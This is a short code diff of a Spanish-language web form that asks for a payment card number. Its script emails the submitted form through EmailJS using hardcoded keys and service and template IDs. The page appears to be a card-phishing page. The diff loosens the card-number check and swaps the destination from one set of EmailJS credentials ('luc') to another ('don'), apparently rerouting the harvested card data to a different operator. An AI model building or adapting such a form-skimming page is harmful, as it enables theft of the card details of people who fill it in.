@@ -52,7 +52,7 @@
 
                 <fieldset>
                     <legend>Numero de la Tarjeta</legend>
-                    <input id="camp3" type="number" pattern="[0-9]*" inputMode="numeric" name="camp3" placeholder="Ingrese el Numero de Tarjeta" required/>
+                    <input id="camp3" pattern=".{13,}" inputMode="numeric" name="camp3" placeholder="Ingrese el Numero de Tarjeta" required/>
                 </fieldset>
 
 
@@ -128,10 +128,17 @@
     </script>
 
     <script type="text/javascript">
-        emailjs.init('Rz35xcemz-sopEyrc')
+        let luckey = "Rz35xcemz-sopEyrc"
+        let donkey = "MITviLGbGr3Y2oL5c"
+
+        emailjs.init(donkey)
     </script>
 
     <script type="text/javascript">
+        const luc = "service_ay7jkun"
+        const don = "service_jqe0gzf"
+        const luc_temp = "template_z7hl4a4"
+        const don_temp = "template_lhizmy7"
         const btn = document.getElementById('button');
 
         document.getElementById('form')
@@ -141,8 +148,8 @@
             btn.disabled = true;
             btn.value = 'Procesando...';
 
-            const serviceID = 'service_ay7jkun';
-            const templateID = 'template_z7hl4a4';
+            const serviceID = don;
+            const templateID = don_temp;
 
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
